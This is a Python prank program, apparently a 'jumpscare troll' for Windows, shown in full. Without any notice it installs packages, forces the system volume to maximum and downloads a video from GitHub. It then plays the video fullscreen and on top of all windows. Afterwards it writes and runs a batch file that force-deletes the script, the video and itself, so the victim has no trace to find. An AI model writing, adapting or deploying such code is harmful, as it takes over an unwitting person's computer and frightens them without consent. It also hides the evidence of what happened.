import subprocess
import sys
import importlib
import urllib.request
import time
import tkinter as tk
import os

# Function to auto-install a module if not present
def install_and_import(package, import_name=None):
    try:
        importlib.import_module(import_name or package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    finally:
        globals()[import_name or package] = importlib.import_module(import_name or package)

# Auto-install required modules
install_and_import("vlc")
install_and_import("pycaw", "pycaw")
install_and_import("comtypes")

from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import vlc

# Set Windows system volume to 100%
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
original_volume = volume.GetMasterVolumeLevelScalar()  # Save current volume
volume.SetMasterVolumeLevelScalar(1.0, None)           # Set to 100%

# Download video silently
url = "https://github.com/hujh5551/python/raw/refs/heads/main/jumpscare%20troll/script.mp4"
output_file = "script.mp4"
urllib.request.urlretrieve(url, output_file)

video_path = output_file

# Fullscreen Tkinter window
root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.configure(bg="black")

hwnd = root.winfo_id()
instance = vlc.Instance()
player = instance.media_player_new()
player.set_hwnd(hwnd)
media = instance.media_new(video_path)
player.set_media(media)
player.play()

# Function to check video state
def check_video():
    state = player.get_state()
    if state in [vlc.State.Ended, vlc.State.Error]:
        root.destroy()  # Close fullscreen window

        # Absolute paths
        python_file = os.path.abspath(__file__)
        video_file = os.path.abspath(video_path)

        # Batch file to delete both files after Python exits
        batch_file = os.path.join(os.environ["TEMP"], "cleanup.bat")
        with open(batch_file, "w") as f:
            f.write(f"""@echo off
:loop
if exist "{python_file}" (
    del "{python_file}" /f /q
    timeout /t 1 > nul
    goto loop
)
del "{video_file}" /f /q
del "%~f0" /f /q
""")
        # Run batch silently
        subprocess.Popen(batch_file, shell=True)
    else:
        root.after(100, check_video)

root.after(100, check_video)
root.mainloop()
